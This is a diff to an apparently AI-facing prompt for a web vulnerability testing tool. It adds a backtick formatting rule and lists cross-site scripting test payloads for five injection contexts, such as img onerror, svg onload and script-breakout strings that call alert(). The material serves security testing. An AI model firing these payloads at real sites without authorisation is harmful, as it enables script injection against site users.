@@ -140,27 +140,33 @@ STEP 5 — CONTEXT-SPECIFIC ACTION PLANS
 For each lead or finding, provide an action plan using ONLY these context-matched payloads.
 Do NOT mix contexts. Do NOT suggest SQL injection.
 
+CRITICAL FORMATTING RULE FOR PAYLOADS:
+You MUST format every payload as a Markdown inline code block using backticks.
+CORRECT:   `"><img src=x onerror=alert(1)>`
+INCORRECT: "><img src=x onerror=alert(1)>
+Raw HTML tags in your output will break the Markdown renderer. Always use backticks.
+
   CONTEXT A (between tags):
-    Test: <img src=x onerror=alert(document.domain)>
-    Test: <svg onload=alert(1)>
-    Test: <script>alert(1)</script>
+    Test: `<img src=x onerror=alert(document.domain)>`
+    Test: `<svg onload=alert(1)>`
+    Test: `<script>alert(1)</script>`
 
   CONTEXT B (quoted attribute):
-    Test: "><img src=x onerror=alert(1)>
-    Test: " autofocus onfocus=alert(1) x="
+    Test: `"><img src=x onerror=alert(1)>`
+    Test: `" autofocus onfocus=alert(1) x="`
 
   CONTEXT C (unquoted attribute):
-    Test: x onmouseover=alert(1)
-    Test: x> <img src=x onerror=alert(1)>
+    Test: `x onmouseover=alert(1)`
+    Test: `x> <img src=x onerror=alert(1)>`
 
   CONTEXT D (JavaScript string):
-    Test: '-alert(document.domain)-'
-    Test: \\'; alert(document.domain)//
-    Test: </script><script>alert(document.domain)</script>
+    Test: `'-alert(document.domain)-'`
+    Test: `\\'; alert(document.domain)//`
+    Test: `</script><script>alert(document.domain)</script>`
 
   CONTEXT E (template literal):
-    Test: ${alert(document.domain)}
-    Test: `+alert(document.domain)+`
+    Test: `${alert(document.domain)}`
+    Test: `` `+alert(document.domain)+` ``
 """.strip(),
     },
 }
